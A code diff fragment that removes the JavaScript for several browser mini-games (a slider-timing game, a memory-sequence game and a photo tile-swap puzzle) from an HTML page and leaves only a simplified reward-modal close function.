-            document.getElementById('sliderScore').innerText = sliderScore;
-            document.getElementById('sliderRestartBtn').style.display = 'none';
-            document.getElementById('sliderLockBtn').style.display = 'inline-block';
-            
-            // Randomize target zone position
-            const targetZone = document.getElementById('sliderTargetZone');
-            const randomLeft = Math.floor(Math.random() * 60) + 10; // 10% to 70%
-            targetZone.style.left = `${randomLeft}%`;
-
-            runSliderAnimation();
-        }
-
-        function runSliderAnimation() {
-            const thumb = document.getElementById('sliderThumb');
-            sliderPos += sliderDir;
-            if (sliderPos >= 95 || sliderPos <= 0) sliderDir *= -1;
-            thumb.style.left = `${sliderPos}%`;
-            sliderAnimId = requestAnimationFrame(runSliderAnimation);
-        }
-
-        function lockSlider() {
-            cancelAnimationFrame(sliderAnimId);
-            const thumb = document.getElementById('sliderThumb');
-            const targetZone = document.getElementById('sliderTargetZone');
-            
-            const thumbLeft = parseFloat(thumb.style.left || 0);
-            const targetLeft = parseFloat(targetZone.style.left);
-            const targetWidth = 18; // percentage width approx
-
-            if (thumbLeft >= targetLeft && thumbLeft <= (targetLeft + targetWidth)) {
-                sliderScore++;
-                document.getElementById('sliderScore').innerText = sliderScore;
-                if (sliderScore >= 5) {
-                    document.getElementById('sliderLockBtn').style.display = 'none';
-                    document.getElementById('sliderRestartBtn').style.display = 'inline-block';
-                    document.getElementById('rewardModal').style.display = 'flex';
-                    createFloatingBubbles();
-                    return;
-                }
-            }
-            // Next round
-            const randomLeft = Math.floor(Math.random() * 60) + 10;
-            targetZone.style.left = `${randomLeft}%`;
-            runSliderAnimation();
-        }
-
-        // --- GAME 3: SELAM KEBEDE (Cosmic Memory Flash - 10 Levels) ---
-        let memorySequence = [], playerMemorySequence = [], memoryLevel = 1, isMemoryPlaying = false;
-
-        function resetMemoryGame() {
-            memoryLevel = 1;
-            memorySequence = [];
-            playerMemorySequence = [];
-            isMemoryPlaying = false;
-            document.getElementById('memoryLevel').innerText = memoryLevel;
-            document.getElementById('memoryStatusText').innerText = "Press Start to begin!";
-            document.getElementById('startMemoryBtn').style.display = 'inline-block';
-            document.getElementById('memoryRestartBtn').style.display = 'none';
-        }
-
-        function startMemoryGame() {
-            memoryLevel = 1;
-            memorySequence = [];
-            document.getElementById('memoryLevel').innerText = memoryLevel;
-            document.getElementById('startMemoryBtn').style.display = 'none';
-            document.getElementById('memoryRestartBtn').style.display = 'none';
-            nextMemoryRound();
-        }
-
-        function nextMemoryRound() {
-            playerMemorySequence = [];
-            memorySequence.push(Math.floor(Math.random() * 6));
-            playMemorySequence();
-        }
-
-        function playMemorySequence() {
-            isMemoryPlaying = true;
-            document.getElementById('memoryStatusText').innerText = "Watch the sequence...";
-            let i = 0;
-            const tiles = document.querySelectorAll('.memory-tile');
-            // Speed gets slightly faster as levels increase
-            const speed = Math.max(300, 700 - (memoryLevel * 35));
-            const interval = setInterval(() => {
-                if (i >= memorySequence.length) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        isMemoryPlaying = false;
-                        document.getElementById('memoryStatusText').innerText = "Your turn! Repeat sequence.";
-                    }, 300);
-                    return;
-                }
-                const tileIndex = memorySequence[i];
-                tiles[tileIndex].classList.add('active-flash');
-                setTimeout(() => {
-                    tiles[tileIndex].classList.remove('active-flash');
-                }, speed - 150);
-                i++;
-            }, speed);
-        }
-
-        function handleMemoryClick(index) {
-            if (isMemoryPlaying) return;
-            const tiles = document.querySelectorAll('.memory-tile');
-            tiles[index].classList.add('active-flash');
-            setTimeout(() => tiles[index].classList.remove('active-flash'), 250);
-
-            playerMemorySequence.push(index);
-            const currentStep = playerMemorySequence.length - 1;
-
-            if (playerMemorySequence[currentStep] !== memorySequence[currentStep]) {
-                document.getElementById('memoryStatusText').innerText = "❌ Wrong! Game Over.";
-                document.getElementById('memoryRestartBtn').style.display = 'inline-block';
-                isMemoryPlaying = true;
-                return;
-            }
-
-            if (playerMemorySequence.length === memorySequence.length) {
-                if (memoryLevel >= 10) {
-                    document.getElementById('memoryStatusText').innerText = "🎉 Mastermind! Completed Level 10!";
-                    document.getElementById('memoryRestartBtn').style.display = 'inline-block';
-                    document.getElementById('rewardModal').style.display = 'flex';
-                    createFloatingBubbles();
-                    isMemoryPlaying = true;
-                } else {
-                    memoryLevel++;
-                    document.getElementById('memoryLevel').innerText = memoryLevel;
-                    document.getElementById('memoryStatusText').innerText = `Correct! Level ${memoryLevel} incoming...`;
-                    setTimeout(nextMemoryRound, 1200);
-                }
-            }
-        }
-
-        // --- GAME 4: SELAM GIRMA (Full-Screen Photo Puzzle) ---
-        let currentLevel = 3, gridSize = 4, puzzleTiles = [], solvedState = [], moveCount = 0, moveLimit = 35, isGameOver = false, selectedTileIndex = null;
-
-        function changePuzzleLevel() {
-            const selectEl = document.getElementById('puzzleLevelSelect');
-            currentLevel = parseInt(selectEl.value);
-            if (currentLevel === 1) { gridSize = 2; moveLimit = 15; }
-            else if (currentLevel === 2) { gridSize = 3; moveLimit = 25; }
-            else if (currentLevel === 3) { gridSize = 4; moveLimit = 35; }
-            else if (currentLevel === 4) { gridSize = 5; moveLimit = 50; }
-            else if (currentLevel === 5) { gridSize = 6; moveLimit = 70; }
-            preparePuzzleScreen();
-        }
-
-        function preparePuzzleScreen() {
-            moveCount = 0;
-            isGameOver = false;
-            selectedTileIndex = null;
-            const totalTiles = gridSize * gridSize;
-            puzzleTiles = [];
-            solvedState = [];
-            for (let i = 0; i < totalTiles; i++) { solvedState.push(i); puzzleTiles.push(i); }
-            document.getElementById('startPuzzleBtn').style.display = 'inline-block';
-            document.getElementById('replayPuzzleBtn').style.display = 'none';
-            document.getElementById('gameOverBtn').style.display = 'none';
-            document.getElementById('moveLimitDisplay').innerText = moveLimit;
-            document.getElementById('puzzleStatus').style.color = 'var(--accent-cyan)';
-            
-            const grid = document.getElementById('puzzleGrid');
-            grid.style.gridTemplateColumns = `repeat(${gridSize}, 1fr)`;
-            grid.style.gridTemplateRows = `repeat(${gridSize}, 1fr)`;
-            renderInitialUnsolvedGrid();
-        }
-
-        function renderInitialUnsolvedGrid() {
-            const grid = document.getElementById('puzzleGrid');
-            grid.innerHTML = '';
-            const totalTiles = gridSize * gridSize;
-            const percentageStep = gridSize > 1 ? 100 / (gridSize - 1) : 0;
-            for (let i = 0; i < totalTiles; i++) {
-                const tile = document.createElement('div');
-                tile.className = 'puzzle-tile';
-                const col = i % gridSize;
-                const row = Math.floor(i / gridSize);
-                if (customUploadedImageUrl) tile.style.backgroundImage = `url('${customUploadedImageUrl}')`;
-                tile.style.backgroundSize = `${gridSize * 100}% ${gridSize * 100}%`;
-                tile.style.backgroundPosition = `${col * percentageStep}% ${row * percentageStep}%`;
-                grid.appendChild(tile);
-            }
-            document.getElementById('moveCount').innerText = moveCount;
-        }
-
-        function initPuzzleGame() {
-            moveCount = 0;
-            isGameOver = false;
-            selectedTileIndex = null;
-            document.getElementById('startPuzzleBtn').style.display = 'none';
-            document.getElementById('replayPuzzleBtn').style.display = 'none';
-            document.getElementById('gameOverBtn').style.display = 'none';
-            do {
-                for (let i = puzzleTiles.length - 1; i > 0; i--) {
-                    const j = Math.floor(Math.random() * (i + 1));
-                    [puzzleTiles[i], puzzleTiles[j]] = [puzzleTiles[j], puzzleTiles[i]];
-                }
-            } while (checkIsWon());
-            renderPuzzle();
-        }
-
-        function checkIsWon() {
-            for (let i = 0; i < puzzleTiles.length; i++) { if (puzzleTiles[i] !== solvedState[i]) return false; }
-            return true;
-        }
-
-        function renderPuzzle() {
-            const grid = document.getElementById('puzzleGrid');
-            grid.innerHTML = '';
-            let isWon = checkIsWon();
-            const totalTiles = gridSize * gridSize;
-            const percentageStep = gridSize > 1 ? 100 / (gridSize - 1) : 0;
-            for (let i = 0; i < totalTiles; i++) {
-                const tile = document.createElement('div');
-                tile.className = 'puzzle-tile';
-                const tileValue = puzzleTiles[i];
-                const col = tileValue % gridSize;
-                const row = Math.floor(tileValue / gridSize);
-                if (customUploadedImageUrl) tile.style.backgroundImage = `url('${customUploadedImageUrl}')`;
-                tile.style.backgroundSize = `${gridSize * 100}% ${gridSize * 100}%`;
-                tile.style.backgroundPosition = `${col * percentageStep}% ${row * percentageStep}%`;
-                if (i === selectedTileIndex) {
-                    tile.style.borderColor = 'var(--accent-pink)';
-                    tile.style.transform = 'scale(0.95)';
-                }
-                tile.addEventListener('click', () => handleTileClick(i));
-                grid.appendChild(tile);
-            }
-            document.getElementById('moveCount').innerText = moveCount;
-            if (isWon && !isGameOver) {
-                isGameOver = true;
-                document.getElementById('replayPuzzleBtn').style.display = 'inline-block';
-                setTimeout(() => {
-                    document.getElementById('rewardModal').style.display = 'flex';
-                    createFloatingBubbles();
-                }, 300);
-            }
-        }
-
-        function handleTileClick(index) {
-            if (isGameOver) return;
-            if (selectedTileIndex === null) {
-                selectedTileIndex = index;
-                renderPuzzle();
-            } else {
-                [puzzleTiles[selectedTileIndex], puzzleTiles[index]] = [puzzleTiles[index], puzzleTiles[selectedTileIndex]];
-                selectedTileIndex = null;
-                moveCount++;
-                renderPuzzle();
-                if (moveCount >= moveLimit && !checkIsWon()) {
-                    isGameOver = true;
-                    document.getElementById('gameOverBtn').style.display = 'inline-block';
-                    const statusEl = document.getElementById('puzzleStatus');
-                    statusEl.innerHTML = `❌ Limit reached (<span id="moveCount">${moveCount}</span>/<span id="moveLimitDisplay">${moveLimit}</span>).`;
-                    statusEl.style.color = '#ef4444';
-                }
-            }
-        }
-
-        function closeRewardModal() { document.getElementById('rewardModal').style.display = 'none'; }
-
-        function createFloatingBubbles() {
-            const modal = document.getElementById('rewardModal');
-            for (let i = 0; i < 15; i++) {
-                const bubble = document.createElement('div');
-                bubble.className = 'bubble';
-                const size = Math.random() * 30 + 10;
-                bubble.style.width = `${size}px`;
-                bubble.style.height = `${size}px`;
-                bubble.style.left = `${Math.random() * 100}%`;
-                bubble.style.animationDuration = `${Math.random() * 2 + 3}s`;
-                bubble.style.animationDelay = `${Math.random() * 1}s`;
-                modal.appendChild(bubble);
-            }
+        function closeRewardModal() {
+            document.getElementById('rewardModal').style.display = 'none';
         }
     </script>
 </body>
